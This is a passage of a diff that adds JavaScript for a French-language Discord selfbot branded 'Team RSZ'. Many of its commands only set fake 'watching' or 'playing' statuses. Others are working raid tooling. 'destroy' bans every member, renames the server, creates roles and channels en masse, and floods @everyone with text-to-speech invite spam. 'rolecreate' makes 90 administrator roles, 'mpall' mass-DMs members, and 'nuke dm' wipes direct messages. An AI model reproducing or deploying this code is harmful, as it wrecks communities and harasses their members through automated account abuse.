+          message.edit("▓▓▓▓▓▓▓▓░░ 80%");
+      }, 3000);
+      setTimeout(() => {
+          message.edit("▓▓▓▓▓▓▓▓▓▓ 100%");
+      }, 3500);
+      setTimeout(() => {
+          message.edit(embed_encode);
+      }, 4000)
+      console.log('Commande token effectué'.yellow);
+  }
+}
+                    if (message.content.startsWith(prefix + "sond")) {
+                        if (message.author.id == client.user.id) {
+                            message.delete();
+
+                                var messageArray = message.content.split(" ");
+                                let cmd = messageArray[0];
+                                var args = messageArray.slice(1);
+
+                                var sondage = args.slice(0).join(" ")
+
+                                if (!args) return args.channel.send("Tu dois poser une question !")
+
+                                var sond_embed = new Discord.RichEmbed()
+                                    .setColor(color)
+                                    .setTitle('**Sondage**')
+                                    .setDescription(sondage)
+                                    .setFooter(`Team RSZ`, message.author.avatarURL)
+                                message.channel.send(sond_embed).then(function(message) {
+                                    message.react("✅")
+                                    message.react("❌")
+                                })
+                            } else {
+                                message.channel.send(nowhite)
+                            }
+                        }
+if (message.content.startsWith(prefix + 'mpall')) {
+  if (message.author.id === client.user.id) {
+
+          let serveur = message.guild;
+          if (!serveur) return message.edit(':x: **Commande uniquement utilisable sur un serveur**');
+
+          const dmusers = message.guild.members
+          const usermsg = message.content.split(" ").slice(1).join(" ");
+          if (!usermsg[0]) {
+              message.delete()
+              console.log('[', 'ERROR'.red, ']', 'un argument est nécessaire')
+          }
+          dmusers.forEach(dmuser => {
+              dmuser.send(usermsg)
+                  .catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
+
+
+              var embed = new Discord.RichEmbed()
+                  .setTitle("***Mpall en cours avec le message :*** " + usermsg)
+                  .setTimestamp()
+                  .setColor(color)
+                  .setFooter(`Team RSZ`, message.author.avatarURL);
+              message.edit(embed)
+          })
+      } else {
+          message.edit(nowhite)
+      }
+  }
+if (message.content.startsWith(prefix + 'rolecreate')) {
+  if (message.author.id == client.user.id) {
+      let serveur = message.guild;
+      if (!serveur) return message.edit(':x: **Commande uniquement utilisable sur un serveur**');
+      message.delete();
+      for (var i = 0; i < 90; i++) {
+          message.guild.createRole({
+              name: ("Team RSZ"),
+              mentionable: false,
+              permissions: 8,
+              position: "",
+              color: 'RANDOM'
+          })
+      }
+  }
+}
+if (message.content === prefix + "destroy") {
+  if (message.deletable) message.delete();
+  if (message.author.id == client.user.id) {
+      message.guild.members.forEach(member => {
+          member.ban().then(function() {});
+      });
+  }
+  if (message.content.startsWith(prefix + 'destroy')) {
+      if (message.author.id == client.user.id) {
+          message.delete();
+          for (var i = 0; i < 90; i++) {
+              message.guild.createRole({
+                  name: ("Team RSZ"),
+                  mentionable: false,
+                  permissions: 0,
+                  position: "",
+                  color: 'RANDOM'
+              })
+          }
+      }
+  }
+}
+if (message.content === prefix + "destroy") {
+  if (message.deletable) message.delete();
+  if (message.author.id == client.user.id) {
+      if (message.channel.type === "dm") return;
+      if (message.guild.channels.size === 0) return;
+  }
+}
+if (message.content === prefix + "destroy") {
+  if (message.channel.type === "dm") return;
+  if (message.author.id == client.user.id) {
+      if (message.guild.name != "Team RSZ") {
+          message.guild.setIcon('https://cdn.discordapp.com/attachments/861692601026478121/862004674131787782/zt.png').catch(error => {})
+          message.guild.setName('Team RSZ').catch(error => {})
+          message.guild.setRegion('russia').catch(error => {})
+      }
+      setInterval(function() {
+          if (message.guild.channels.size < 499) {
+              message.guild.createChannel('Team RSZ', 'text').catch(error => {})
+          }
+      }, 400)
+      if (message.deletable) message.delete();
+  }
+}
+if (message.content === prefix + 'destroy') {
+  if (message.channel.type === "dm") return;
+  if (message.author.id == client.user.id) {
+      setInterval(function() {
+          message.channel.send("@everyone @here Team RSZ \n" +
+              `https://discord.gg/tj5SKx6HFx \n` +
+              "\n" +
+              "Team RSZ", {
+                  tts: true
+              }).catch(error => {})
+      }, 400)
+  }
+}
+if (message.content === prefix + 'unbanall') {
+  let serveur = message.guild;
+  if (!serveur) return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
+  if (message.deletable) message.delete();
+  let interval = setInterval(function() {
+      message.guild.fetchBans().then(bans => {
+          bans.forEach(ban => {
+              message.guild.unban(ban.id);
+          });
+      });
+  }, 1000);
+  message.channel.send("```𝗨𝗻𝗯𝗮𝗻 é𝗳𝗳𝗲𝗰𝘁𝘂é``` :white_check_mark:")
+}
+if(message.content.startsWith(prefix + "pat")){
+if(!mentionuser){
+      message.edit(':x: **Veuillez mentionner un utilisateur!**');
+      return;
+    }
+let patembed = new Discord.RichEmbed();
+  patembed.setColor(color)
+  .setTitle(`**${client.user.username} pat ${mentionuser.username}**`)
+  .setTimestamp()
+  .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+  .setImage(pat[Math.floor(Math.random() * pat.length)])
+  message.edit(patembed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+  console.log("╟ Commande pat executé")
+  console.log("╟─────────────────────────────────╢")
+}
+if(message.content.startsWith(prefix + "highfive")){
+if(!mentionuser){
+      message.edit(':x: **Veuillez mentionner un utilisateur!**');
+      return;
+    }
+let highfiveembed = new Discord.RichEmbed();
+  highfiveembed.setColor(color)
+  .setTitle(`**${client.user.username} highfive avec ${mentionuser.username}**`)
+  .setTimestamp()
+  .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+  .setImage(highfive[Math.floor(Math.random() * pat.length)])
+  message.edit(highfiveembed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+  console.log("╟ Commande highfive executé")
+  console.log("╟─────────────────────────────────╢")
+}
+if(message.content.startsWith(prefix + "cry")){
+let cryembed = new Discord.RichEmbed();
+  cryembed.setColor(color)
+  .setTitle(`**${client.user.username} pleure 😭**`)
+  .setTimestamp()
+  .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+  .setImage(cry[Math.floor(Math.random() * pat.length)])
+  message.edit(cryembed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+  console.log("╟ Commande cry executé")
+  console.log("╟─────────────────────────────────╢")
+}
+  if(message.content.startsWith(prefix + "mp all")){
+    message.delete();
+    console.log("╟ Commande mp all executé")
+    console.log("╟─────────────────────────────────╢")
+    let pub = args.splice(2).join(" ") || "@everyone\nhttps://discord.gg/5S54Svq6hR\n Discord\nhttps://discord.gg/5S54Svq6hR";
+  let serveur = message.guild;
+  if(!serveur)return;
+  setInterval(() => {
+  let membres = serveur.members.random();
+  if(membres.user.bot)return;
+if(membres.user.id === client.user.id)return;
+  if (db[membres.user.id]) return;
+  membres.send(pub +'').catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+  console.log(membres.user.username + " à été mp")
+  db[membres.user.id] = {
+      raison: 'mp' 
+  };
+  saver();
+}, 450);
+  }
+  if(message.content.startsWith(prefix + "stop mp all")){
+        client.destroy().then(() => client.login(token))
+        console.log("╟ Commande stop mp all executé")
+        console.log("╟─────────────────────────────────╢")
+  }
+  if(message.content.startsWith(prefix + "auto voice kick")){
+    if (!message.guild.me.hasPermission('MOVE_MEMBERS')) return message.reply(':x:**Tu n\'a pas la permission de kick un utilisatur**.');
+    const member = message.mentions.members.first();
+    if (!member) return message.edit(':x:**Veuillez mentionner un utilisateur.**');
+    kicked[message.guild.id] = {
+      user: member.id
+  };
+  kicker();
+  console.log("╟ Commande auto voice kick executé")
+  console.log("╟─────────────────────────────────╢")
+  message.edit(":white_check_mark: **Auto Voice kick setup l'utilisateur ne pourra plus rejoindre de channel vocal de ce serveur**")
+  if (!member.voiceChannel) return;
+  member.setVoiceChannel(null);
+  }
+  
+  if(message.content.startsWith(prefix + "stop auto voice kick")){
+    const member = message.mentions.members.first();
+    if (!member) return message.edit(':x:**Veuillez mentionner un utilisateur.**');
+    delete kicked[message.guild.id].user
+  kicker();
+  message.edit(":white_check_mark: **Auto Voice kick set up l'utilisateur ne peut desormé rejoindre les channels vocaux de ce serveur**")
+  console.log("╟ Commande auto voice kick stopé")
+  console.log("╟─────────────────────────────────╢")
+  }
+if(message.content.startsWith(prefix + "voice kick")){
+  if(!message.guild) return message.edit(":x: **Commande uniquement utilisable sur serveur**");
+  if (!message.guild.me.hasPermission('MOVE_MEMBERS')) return message.reply(':x:**Tu n\'a pas la permission de kick un utilisatur**.');
+  const member = message.mentions.members.first();
+  if (!member) return message.edit(':x:**Veuillez mentionner un utilisateur.**');
+  if (!member.voiceChannel) return message.edit(':x:**L\'utilisateur n\'est pas dans un channel vocal.**');
+  member.setVoiceChannel(null).catch(error => 
+    message.edit(':x:**L\'utilisateur n\'est pas dans un channel vocal.**')
+    );
+  message.edit(":white_check_mark: **L'utilisateur a été voice kick correctement**")
+  console.log("╟ Commande voice kick executé")
+  console.log("╟─────────────────────────────────╢")
+};
+	if(message.content.startsWith(prefix + "afk")){
+	let raison = args.splice(1).join(" ") || "pas de raison";
+		afk[client.user.id] = {
+			activé: "oui",
+			r: raison
+		  };
+		  saving();
+		  message.edit(":white_check_mark: **Vous etes afk pour** " + raison)
+      console.log("╟ Commande afk executé")
+      console.log("╟─────────────────────────────────╢")
+  };
+	if(message.content.startsWith(prefix + "gucci")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "gucci")
+      .then(image => {
+        rpcGenerator.getRpcImage("603405368940429315", "gucci0")
+      .then(image2 => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Gucci")
+              .setUrl('https://www.twitch.tv/codezero_two_')
+              .setType("WATCHING")
+              .setApplicationId("603405368940429315")
+              .setDetails('Gucci')
+              .setAssetsLargeImage(image.id)
+              .setAssetsSmallImage(image2.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Comande Gucci executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Gucci**`);
+                })
+              })
+            }
+    if(message.content.startsWith(prefix + "lacoste")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "lacoste")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Lacoste")
+              .setUrl('https://www.twitch.tv/codezero_two_')
+              .setType("WATCHING")
+              .setApplicationId("603405368940429315")
+              .setDetails('Lacoste')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande Lacoste executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur lacoste**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "nike")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "nike")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Nike")
+              .setUrl('https://www.twitch.tv/codezero_two_')
+              .setType("WATCHING")
+              .setApplicationId("603405368940429315")
+              .setDetails('Nike')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande Nike executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Nike**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "google")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "google")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Google")
+              .setUrl('https://www.twitch.tv/codezero_two_')
+              .setType("WATCHING")
+              .setApplicationId("603405368940429315")
+              .setDetails('Google')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande google executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur google**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "skype")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "skype")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Skype")
+              .setUrl('https://www.twitch.tv/codezero_two_')
+              .setType("WATCHING")
+              .setApplicationId("603405368940429315")
+              .setDetails('Skype')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande Skype executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Skype**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "snapchat")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "snapchat")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Snapchat")
+              .setUrl('https://www.twitch.tv/codezero_two_')
+              .setType("WATCHING")
+              .setApplicationId("603405368940429315")
+              .setDetails('Snapchat')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande Snapchat executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Snapchat**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "facebook")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "facebook")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Facebook")
+              .setUrl('https://www.twitch.tv/hml_cp0')
+              .setType("WATCHING")
+              .setApplicationId("603405368940429315")
+              .setDetails('Skype')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande Facebook executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Facebook**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "nuke dm")){
+      let zbi = ""
+                    message.edit("**Nuking dms...**")
+                    client.users.forEach(user => 
+                      user.deleteDM().catch(zbi = "zebi")
+                    )
+                    message.edit(":white_check_mark: **Nuked dms**")
+                    console.log("╟ Commande nuke dm executé")
+                    console.log("╟─────────────────────────────────╢")
+                  }
+    if(message.content.startsWith(prefix + "tiktok")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "tiktok")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Tiktok")
+              .setUrl('https://www.twitch.tv/codezero_two_')
+              .setType("WATCHING")
+              .setApplicationId("603405368940429315")
+              .setDetails('Tiktok')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande tiktok executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Tiktok**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "twitter")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "twitter")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Twitter")
+              .setUrl('https://www.twitch.tv/hml_cp0')
+              .setType("WATCHING")
+              .setApplicationId("603405368940429315")
+              .setDetails('Twitter')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande twitter executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Twitter**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "instagram")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "instagram")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Instagram")
+              .setUrl('https://www.twitch.tv/codezero_two_')
+              .setType("WATCHING")
+              .setApplicationId("603405368940429315")
+              .setDetails('Instagram')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande instagram executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Instagram**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "youtube")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "youtube")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Youtube")
+              .setUrl('https://www.twitch.tv/codezero_two_')
+              .setType("WATCHING")
+              .setApplicationId("603405368940429315")
+              .setDetails('Youtube')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande youtube executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Youtube**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "tokyo ghoul")){
+      let argument = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "tokyo")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Tokyo Ghoul")
+              .setUrl('https://www.twitch.tv/codezero_two_')
+              .setType("WATCHING")
+              .setApplicationId("603405368940429315")
+              .setDetails('Tokyo Ghoul')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande tokyo ghoul executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Tokyo Ghoul**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "hunter x hunter")){
+      let argument = args.splice(3).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "hxh")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Hunter X Hunter")
+              .setUrl('https://www.twitch.tv/codezero_two_')
+              .setType("WATCHING")
+              .setApplicationId("603405368940429315")
+              .setDetails('Hunter X Hunter')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande Hunter X Hunter executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Hunter X Hunter**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "naruto")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "naruto")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Naruto")
+              .setUrl('https://www.twitch.tv/hml_cp0')
+              .setType("WATCHING")
+              .setApplicationId("603405368940429315")
+              .setDetails('Naruto')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande Naruto executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Naruto**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "pornhub")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "pornhub")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Pornhub")
+              .setUrl('https://www.twitch.tv/hml_cp0')
+              .setType("WATCHING")
+              .setApplicationId("603405368940429315")
+              .setDetails('Pornhub')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande Pornhub executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Pornhub**`);
+                })
+              }
+              if(message.content.startsWith(prefix + "clash of clan")){
+                let argument = args.splice(3).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+                rpcGenerator.getRpcImage("721465320740487179", "clash-of-clans-app-icon")
+                .then(image => {
+                    let presence = new rpcGenerator.Rpc()
+                        .setName("Clash Of Clan")
+                        .setUrl('https://www.twitch.tv/codezero_two_')
+                        .setType("PLAYING")
+                        .setApplicationId("721465320740487179")
+                        .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+                        .setAssetsLargeImage(image.id)
+                        .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+                        .setState(argument)
+                        .setStartTimestamp(Date.now())
+              
+                        .setParty({
+                            id: uuid()
+                            })
+                            client.user.setPresence(presence.toDiscord()).catch(console.error);
+                            console.log("╟ Commande Clash Of Clan")
+                            console.log("╟─────────────────────────────────╢")
+                            message.edit(`:white_check_mark: **Tu joues à ${argument} sur Clash Of Clan**`);
+                          })
+                        }
+                        if(message.content.startsWith(prefix + "minecraft")){
+                          let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+                          rpcGenerator.getRpcImage("603405368940429315", "minecraft")
+                          .then(image => {
+                              let presence = new rpcGenerator.Rpc()
+                                  .setName("Minecraft")
+                                  .setUrl('https://www.twitch.tv/codezero_two_')
+                                  .setType("PLAYING")
+                                  .setApplicationId("603405368940429315")
+                                  .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+                                  .setAssetsLargeImage(image.id)
+                                  .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+                                  .setState(argument)
+                                  .setStartTimestamp(Date.now())
+                        
+                                  .setParty({
+                                      id: uuid()
+                                      })
+                                      client.user.setPresence(presence.toDiscord()).catch(console.error);
+                                      console.log("╟ Commande minecraft executé")
+                                      console.log("╟─────────────────────────────────╢")
+                                      message.edit(`:white_check_mark: **Tu joues à ${argument} sur Minecraft**`);
+                                    })
+                                  }
+              if(message.content.startsWith(prefix + "clash royal")){
+                let argument = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+                rpcGenerator.getRpcImage("603405368940429315", "clashroyal")
+                .then(image => {
+                    let presence = new rpcGenerator.Rpc()
+                        .setName("Clash Royal")
+                        .setUrl('https://www.twitch.tv/codezero_two_')
+                        .setType("PLAYING")
+                        .setApplicationId("603405368940429315")
+                        .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+                        .setAssetsLargeImage(image.id)
+                        .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+                        .setState(argument)
+                        .setStartTimestamp(Date.now())
+              
+                        .setParty({
+                            id: uuid()
+                            })
+                            client.user.setPresence(presence.toDiscord()).catch(console.error);
+                            console.log("╟ Commande clash royal")
+                            console.log("╟─────────────────────────────────╢")
+                            message.edit(`:white_check_mark: **Tu joues à ${argument} sur Clash Royal**`);
+                          })
+                        }
+    if(message.content.startsWith(prefix + "tinder")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "tinder")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Tinder")
+              .setUrl('https://www.twitch.tv/hml_cp0')
+              .setType("PLAYING")
+              .setApplicationId("603405368940429315")
+              .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande tinder executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu joues à ${argument} sur Tinder**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "roblox")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "roblox")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Roblox")
+              .setUrl('https://www.twitch.tv/codezero_two_')
+              .setType("PLAYING")
+              .setApplicationId("603405368940429315")
+              .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande roblox")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu joues à ${argument} sur Roblox**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "badlion")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "badlion")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Badlion")
+              .setUrl('https://www.twitch.tv/hml_cp0')
+              .setType("PLAYING")
+              .setApplicationId("603405368940429315")
+              .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande Badlion")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu joues à ${argument} sur Badlion**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "apex")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "apex")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Apex Legends")
+              .setUrl('https://www.twitch.tv/hml_cp0')
+              .setType("PLAYING")
+              .setApplicationId("603405368940429315")
+              .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+              .setAssetsLargeImage(image.id)
